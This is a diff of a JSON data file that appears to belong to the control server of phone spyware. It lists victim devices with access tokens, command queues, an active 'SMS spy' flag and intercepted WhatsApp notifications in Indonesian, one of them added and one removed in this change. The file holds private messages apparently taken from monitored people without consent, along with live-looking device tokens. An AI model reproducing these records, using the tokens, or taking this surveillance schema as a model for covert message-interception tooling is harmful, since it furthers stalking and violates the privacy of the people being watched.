@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778030739,
+    "lastSeen": 1776778060812,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "21/04 20:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778062616
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:48",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775733008
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (228 pesan): ~ V4MP",
-        "content": "kalo saat ini yg psling oper power ap",
-        "time": "21/04 19:48",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775732911
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778028502,
+    "lastSeen": 1776778062068,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778030834,
+    "lastSeen": 1776778060858,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
